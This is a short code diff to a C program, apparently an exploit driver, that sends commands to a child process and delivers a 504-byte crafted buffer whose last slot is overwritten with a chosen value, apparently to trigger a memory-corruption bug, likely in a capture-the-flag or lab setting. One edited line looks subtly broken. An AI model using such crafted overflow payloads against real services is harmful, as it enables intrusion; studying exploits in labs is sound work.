@@ -42,27 +42,37 @@ int main() {
     put_bin((char*)expl, explsz);
     put_str("\n");
     send();
+    get_formatted("%*s");
 
-
+    put_str("p 1234567");
+    send();
+    get_formatted("%*s");
 
     put_str("u 1234567\n");
     send();
     get_formatted("%*s");
 
-    unsigned explsz = 504;
-    void* *expl = (void**)malloc(explsz);
+    explsz = 504;
+    *expl = (void**)malloc(explsz);
     // Initialize the buffer with '\1' to make the contents predictable.
     memset((void*)expl, '\1', explsz);
-    expl[explsz/sizeof(void*)-1] = (void*) 0x0000040000000001;
+    expl[explsz/sizeof(void*)-1] = (void*) 0x000003f000000001;
 
     put_str("p ");
     put_bin((char*)expl, explsz);
     put_str("\n");
     send();
-
     get_formatted("%*s");
 
+
+    put_str("l \n");
+    send();
     usleep(100000);
+    get_formatted("%*s");
+
+    put_str("q \n");
+    send();
+    get_formatted("%*s");
 
     kill(pid, SIGINT);
     int status;
